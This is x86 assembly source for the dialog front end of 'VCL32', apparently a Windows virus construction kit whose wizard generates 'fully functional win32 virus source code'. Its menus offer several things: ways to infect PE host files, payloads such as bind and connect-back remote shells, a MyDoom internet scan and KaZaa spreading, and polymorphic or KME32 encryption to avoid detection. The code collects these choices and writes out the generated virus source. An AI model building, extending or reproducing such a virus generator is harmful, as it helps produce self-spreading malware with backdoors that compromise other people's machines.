;VCL32 GUI
;
;simple dialogbox. only nice thing is the resource manipulation in memory.

.586
.model flat
locals


include header.inc


PHASES	equ 10
OPTIONS	equ 5

DROPDOWNMENU	equ 1030
DDM		equ 0
NEXT_BUTTON	equ 1000
NB		equ 1
PREVIOUS_BUTTON	equ 1001
PB		equ 2
DESCR_TEXT	equ 1020
DTT		equ 3
PARAM1_TEXT	equ 1021
P1T		equ 4
PARAM2_TEXT	equ 1022
P2T		equ 5
PARAM3_TEXT	equ 1023
P3T		equ 6
PARAM4_TEXT	equ 1024
P4T		equ 7
PARAM1_EDIT	equ 1010
P1E		equ 8
PARAM2_EDIT	equ 1011
P2E		equ 9
PARAM3_EDIT	equ 1012
P3E		equ 10
PARAM4_EDIT	equ 1013
P4E		equ 11
PICTURE		equ 1040
PIC		equ 12

.data

phase0  db 0,"INTO"
phase1  db 0,"MAIN"
phase2  db "The virus code needs to reference various text strings as API names.  The virus "
	db "can store these strings as text or store a hash value of the text string.  Which "
	db "do you choose?",0
	db 2
	db 0,"HASH","Uses hashes to retrieve APIs",0
 	db 0,"STRG","Uses strings to retrieve APIs",0
phase3  db 0,"FINF"
phase4  db "There are several ways to infect the host file.  VCL32 can generate a virus that "
	db "can infect in two classical ways: by adding a new section or increasing the last "
	db "one, or use a new way.  Which way do you want to use?",0
	db 3
 	db 0,"INCS","Increase last section of host",0
 	db 1,"ADDS","Add section to host",0
 	db "New section name:",0
 	db 0,"INC1","Insert in 1st section of host",0
phase5  db "Although virus payloads are a giveaway in spreading, if a virus doesn't "
	db "activate, what's the point of its existance?  VCL32 always generates a sub "
	db "routine for a payload.  In this sub routine, you want to...",0
	db 7
 	db 0,"NPAY","No activation",0
	db 2,"MSGB","Show MessageBox",0
	db "Message Box Text:",0
	db "Message Box Title:",0
	db 4,"TMSG","Date triggered MsgBox",0
	db "Message Box Text:",0
	db "Message Box Title:",0
	db "Activation day:",0
	db "Activation month:",0
	db 1,"SHEL","Remote shell (bind)",0
	db "Port to listen:",0
	db 2,"CBSH","Remote shell (connect-back)",0
	db "Port:",0
	db "IP (use , instead of .):",0
	db 0,"DOOM","Internet scan for Worm.MyDoom",0
	db 1,"KAZA","Set KaZaa shared folder",0
	db "Directory:",0
phase6  db "Encryption can be used to hide the virus and make it more difficult to detect. "
	db "You have four choices of encryption: don't use it, use a simple XOR, use a "
	db "simple polymorphic engine (coded especially for VCL32) or use the KME32 advanced "
	db "engine.  Which do you want to use?",0
	db 4
	db 0,"NXOR","Don't use encryption",0
	db 0,"XORC","Use XOR encryption",0
	db 0,"POLY","Simple polymorphic engine",0
	db 0,"KMEC","Use KME32 engine",0
phase7  db "Finally, you must decide how the virus will find files to infect.  Remember that "
	db "if you choose to hook an API, you must manually edit the first gen host "
	db "in the generated source to use the API you hooked.  Otherwise, the virus "
	db "will have no way to jump out of the first file.",0
	db 4
	db 0,"DSCN","Infect files in current directory",0
	db 0,"RSCN","Infect files in all fixed/network disks",0
	db 0,"BSCN","Infect files in background",0
	db 1,"PERP","Hook API in host to inject (per process)",0
	db "API to hook:",0
phase8  db 0,"GAPI"
phase9  db 0,"CODA"

welcome_str	db "Welcome to the Virus Creation Labs for Windows virus.  This wizard will guide "
		db "you in the process of creating a fully functional win32 virus source code.  Just "
		db "press START to let the magic begin...",0

byez_str	db "It´s done! Press GENERATE to create the virus.  To compile it, you will need to have TASM "
		db "and TLINK32 in your path, along with Jacky Qwerty's INCLUDE files in the same "
		db "directory as the generated ASM source.",0


generate_str	db "Generate",0
start_str	db "Start",0
next_str	db "Next",0

dlgname db "DIALOG_0",0
iconame	db "ICON_0",0

bitmapname 	db "BITMAP_0",0
		db "BITMAP_1",0
		db "BITMAP_2",0
		db "BITMAP_3",0
		db "BITMAP_4",0
		db "BITMAP_5",0
		db "BITMAP_6",0
		db "BITMAP_7",0
		db "BITMAP_8",0
		db "BITMAP_9",0
		db "BITMAP_10",0
		db "BITMAP_11",0
		db "BITMAP_12",0
		db "BITMAP_13",0
		db "BITMAP_14",0
		db "BITMAP_15",0
		db 0

asmfile db "Assembler files",0,"*.ASM",0
	db 0,0

saveas	db "Save generated virus source code as...",0

itemhnd	dd DROPDOWNMENU, NEXT_BUTTON, PREVIOUS_BUTTON, DESCR_TEXT, PARAM1_TEXT
	dd PARAM2_TEXT, PARAM3_TEXT, PARAM4_TEXT, PARAM1_EDIT, PARAM2_EDIT
	dd PARAM3_EDIT, PARAM4_EDIT, PICTURE
	dd 0

phases	dd ofs phase0, ofs phase1, ofs phase2, ofs phase3, ofs phase4
	dd ofs phase5, ofs phase6, ofs phase7, ofs phase8, ofs phase9

phase_ptr	dd PHASES dup (?)

buffer 	db MAX_PATH dup (?)

hInstance 	dd ?
mem_base	dd ?
mem_pool	dd ?
phase		dd ?
current_edi	dd ?
current_sel	dd ?
asm_mem    	dd ?
image		dd ?
editbox		dd ?

.code

include virdb.inc


start:
	push 0
      	callW GetModuleHandleA
      	mov [hInstance],eax

	call init_mem
	call load_db
	call init_db

      	push 4				;PAGE_READWRITE
      	push 3000h			;MEM_COMMIT+MEM_RESERVE
	push 256*1024
      	push 0
      	callW VirtualAlloc

      	test eax,eax
      	jz @@done
	mov [current_edi],eax
	mov [asm_mem],eax

        push 0
        push ofs dlg_control
        push 0
      	push ofs dlgname
      	push dwo [hInstance]
      	callW DialogBoxParamA

      	push 0c000h			;MEM_DECOMMIT+MEM_RELEASE
      	push 0
      	push dwo [asm_mem]
      	callW VirtualFree

  @@done:
  	call cleanup_db
	call done_mem

	push 0
	callW ExitProcess


lParam	equ esp.cPushad.Arg4
wParam	equ esp.cPushad.Arg3
uMsg	equ esp.cPushad.Arg2
hWnd	equ esp.cPushad.Arg1

dlg_control:
	mov eax,TRUE
	pushad
	mov eax,[uMsg]

	cmp eax,110h			;WM_INITDIALOG
	jne @@no_close

	push ofs iconame
	push dwo [hInstance]
	callW LoadIconA
	xchg eax,esi

	push 1
	pop ebx
  @@seticon:
	push esi
	push ebx
	push 80h			;WM_SETICON
	push dwo [hWnd+4*3]
	callW SendMessageA
	dec ebx
	jns @@seticon

	mov esi, ofs itemhnd
  @@retrieve_hnds:
	lodsd
	test eax,eax
	jz @@fiximages
	push eax
	push dwo [hWnd.Pshd]
	callW GetDlgItem
	mov [esi-4],eax
	jmp @@retrieve_hnds

  @@fiximages:
	push 15				;COLOR_BTNFACE
	callW GetSysColor
	movzx ecx,al
	shl ecx,16
	shr eax,8
	xchg al,ah
	or cx,ax
	xchg ecx,edi

	mov esi,ofs ofs bitmapname
  @@loadimage:
	push 2				;RT_BITMAP
	push esi
	push dwo [hInstance]
	callW FindResourceA

	push eax
	push dwo [hInstance]
	callW LoadResource
	xchg eax,ebx

	mov [ebx+28h],edi

  @@tmp666:
	lodsb
	test al,al
	jnz @@tmp666
	cmp [esi],al
	jne @@loadimage

	mov [phase],0
	call draw_phase
	jmp @@exit

  @@no_close:
  	cmp eax,111h			;WM_COMMAND
  	jne @@no_command

	mov eax,[lParam]
	test eax,eax
	mov eax,[wParam]
	jz @@check_sys

	cmp eax,1 SHL 16 + DROPDOWNMENU	;CBN_SELCHANGE
	jne @@nocombo

	push 0
	push 0
	push 147h			;CB_GETCURSEL
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA

	push 0
	push eax
	push 150h			;CB_GETITEMDATA
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA
	mov [current_sel],eax
	xchg eax,esi

	call clean_gui

	lodsb
	movzx ebp,al
	test ebp,ebp
	jz @@exit

	push FALSE
	push dwo [ofs itemhnd+PIC*4]
	callW ShowWindow

	lodsd
  @@tmp0:
	lodsb
	test al,al
	jnz @@tmp0

	push P1E
	pop ebx
  @@options:
	push TRUE
	push dwo [ofs itemhnd+ebx*4]
	callW EnableWindow

	push TRUE
	push dwo [ofs itemhnd+ebx*4]
	callW ShowWindow

	lea eax,[ebx-4]
	push esi
	push dwo [ofs itemhnd+eax*4]
	push TRUE
	push dwo [ofs itemhnd+eax*4]
	callW ShowWindow
	callW SetWindowTextA

  @@tmp6:
	lodsb
	test al,al
	jnz @@tmp6

	inc ebx
	dec ebp
	jnz @@options
	jmp @@exit

  @@nocombo:
	cmp ax,NEXT_BUTTON
	jne @@no_next
  @@next_phase:
  	cmp [phase],9
  	jbe @@nogen

	push "MSA"
	mov eax,esp

	push 0			;template
	push 0			;callback
	push 0			;custom data
	push eax		;extension
	push 0			;file ext shits
	push 2+80000h+4		;OFN_OVERWRITEPROMPT+OFN_EXPLORER+OFN_HIDEREADONLY
	push ofs saveas		;title
	push 0			;dir
	push 0			;titleshit
	push 0			;titleshit
	push 104h		;filesize
	push ofs buffer		;file
	push 0			;filtershit
	push 0			;filtershit
	push 0			;filtershit
	push ofs asmfile	;filter
	push dwo [hInstance]	;instance
	push [hWnd+18*4]
	push 4*19		;size

	push esp
	callW GetSaveFileNameA
	add esp,4*20

	push 0
	push 80h
	push 2
	push 0
	push 0
	push 0c0000000h
	push ofs buffer
	callW CreateFileA
	mov ebx,eax
	inc eax
	jz @@finish

	push 0
	mov eax,esp
	push 0
	push eax
  	sub edi,[asm_mem]
	push edi
	push dwo [asm_mem]
	push ebx
	callW WriteFile

	mov [esp],ebx
	callW CloseHandle

  	push -1
  	callW MessageBeep
	jmp @@finish

  @@nogen:
	mov eax,[phase]
	mov edi,[current_edi]
	mov [ofs phase_ptr+eax*4],edi

	mov esi,[current_sel]
	lodsb
	movzx ebp,al

  	lodsd
	test ebp,ebp
	jz @@no_param

	xchg eax,esi
	mov ecx,ebp

	imul ebx,ebp,104h
	shl ebp,2
	sub esp,ebx
	add ebp,ebx
	mov ebx,esp

	mov eax,P1E-1
	add eax,ecx
	mov dwo [editbox],eax

  @@pushargs:
	push ecx
	push ebx
	push 104h
	push 0Dh			;WM_GETTEXT
	mov eax,[editbox]
	push dwo [ofs itemhnd+eax*4]
	callW SendMessageA
	pop ecx

	mov eax,ebx
	dec eax
  @@spaces:
	inc eax
	cmp by [eax],ch
	je @@done
	cmp by [eax]," "
	jne @@spaces
	mov by [eax],"|"
	jmp @@spaces
  @@done:

	push ebx
	add ebx,104h
	dec dwo [editbox]
	loop @@pushargs
	xchg eax,esi

  @@no_param:
	push eax
	call copy_snippet

	test ebp,ebp
	jz @@no_param2
	add esp,ebp
  @@no_param2:

	mov [current_edi],edi
	inc dwo [phase]
	call draw_phase
	test eax,eax
	jnz @@exit
	jmp @@next_phase

  @@no_next:
	cmp ax,PREVIOUS_BUTTON
	jne @@no_command
  @@last_phase:
	dec dwo [phase]
	mov eax,[phase]
	mov eax,[ofs phase_ptr+eax*4]
	mov [current_edi],eax
	call draw_phase
	test eax,eax
	jz @@last_phase
	jmp @@exit

  @@check_sys:
	cmp eax,2			;WM_DESTROY
	jne @@exit

  @@finish:
	push 0
	push dwo [hWnd.Pshd]
	callW EndDialog
	jmp @@exit

  @@no_command:
  	mov dwo [esp.Pushad_eax],0

  @@exit:
	popad
	ret


free:
;	pushad
;	push dwo [esp.cPushad.Arg1]
;	callW GlobalFree
;	popad
	ret 4


malloc:
	pushad
	mov eax,[mem_pool]
	mov [esp.Pushad_eax],eax
	add eax,[esp.cPushad.Arg1]
	mov [mem_pool],eax
	popad
	ret 4


init_mem:
	pushad
	push 1024*1024
	push 40h
	callW GlobalAlloc
	mov [mem_pool],eax
	mov [mem_base],eax
	popad
	ret


done_mem:
	pushad
	push dwo [mem_base]
	callW GlobalFree
	popad
	ret


draw_phase:
	sub eax,eax
	pushad

	call clean_gui

	push 0
	push 0
	push 14Bh			;CB_RESETCONTENT
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA

	push TRUE
	push dwo [ofs itemhnd+DDM*4]
	callW ShowWindow

	push TRUE
	push dwo [ofs itemhnd+PB*4]
	callW EnableWindow

	push ofs next_str
	push dwo [ofs itemhnd+NB*4]
	callW SetWindowTextA

	mov ebx,[phase]
	test ebx,ebx
	jnz @@no_start

	mov [current_sel],ofs phase0

	push FALSE
	push dwo [ofs itemhnd+PB*4]
	callW EnableWindow

	push ofs start_str
	push ofs welcome_str
	jmp @@set_exit

  @@no_start:
	cmp ebx,9
	ja @@skip
	jnz @@no_last

	mov [current_sel],ofs phase9
	push ofs generate_str
	push ofs byez_str
  @@set_exit:
	push dwo [ofs itemhnd+DTT*4]
	callW SetWindowTextA

	push dwo [ofs itemhnd+NB*4]
	callW SetWindowTextA

	push FALSE
	push dwo [ofs itemhnd+DDM*4]
	callW ShowWindow
	jmp @@wait4user

  @@no_last:
	mov esi,[ofs phases+ebx*4]
	cmp by [esi],0
	jne @@hasinfo
	mov [current_sel],esi
	jmp @@skip

  @@hasinfo:
	push esi
	push dwo [ofs itemhnd+DTT*4]
	callW SetWindowTextA

  @@tmp1:
  	lodsb
  	test al,al
  	jnz @@tmp1

	lodsb
	movzx ebx,al
  @@next_option:
	mov edi,esi
	lodsb
	movzx ebp,al
	lodsd

	push esi
	push 0
	push 143h			;CB_ADDSTRING
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA

	push edi
	push eax
	push 151h			;CB_SETITEMDATA
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA

  @@tmp2:
  	lodsb
  	test al,al
  	jnz @@tmp2
	dec ebp
	jns @@tmp2

	dec ebx
	jnz @@next_option

	push 0
	push 0
	push 14eh			;CB_SETCURSEL
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA

	push 0
	push 0
	push 150h			;CB_GETITEMDATA
	push dwo [ofs itemhnd+DDM*4]
	callW SendMessageA
	mov [current_sel],eax

  @@wait4user:
	mov dwo [esp.Pushad_eax],1
  @@skip:
	popad
	ret


clean_gui:
	pushad

  	push P1T
  	pop ebx
  @@disable:
	push FALSE
	push dwo [ofs itemhnd+ebx*4]
	callW ShowWindow

	push 0
	push esp
	push dwo [ofs itemhnd+ebx*4]
	callW SetWindowTextA
	pop eax

	inc ebx
	cmp ebx,P4E
	jbe @@disable

  @@redo:
	callW GetTickCount
	and eax,15
	cmp [image],eax
	je @@redo
	mov [image],eax
	xchg ecx,eax

	mov esi,ofs ofs bitmapname
	jecxz @@donetmp
  @@tmp667:
	lodsb
	test al,al
	jnz @@tmp667
	loop @@tmp667
  @@donetmp:

	push esi
	push dwo [hInstance]
	callW LoadBitmapA

	push eax
	push 0				;IMAGE_BITMAP
	push 172h			;STM_SETIMAGE
	push dwo [ofs itemhnd+PIC*4]
	callW SendMessageA

	push TRUE
	push dwo [ofs itemhnd+PIC*4]
	callW ShowWindow

	popad
	ret


end 	start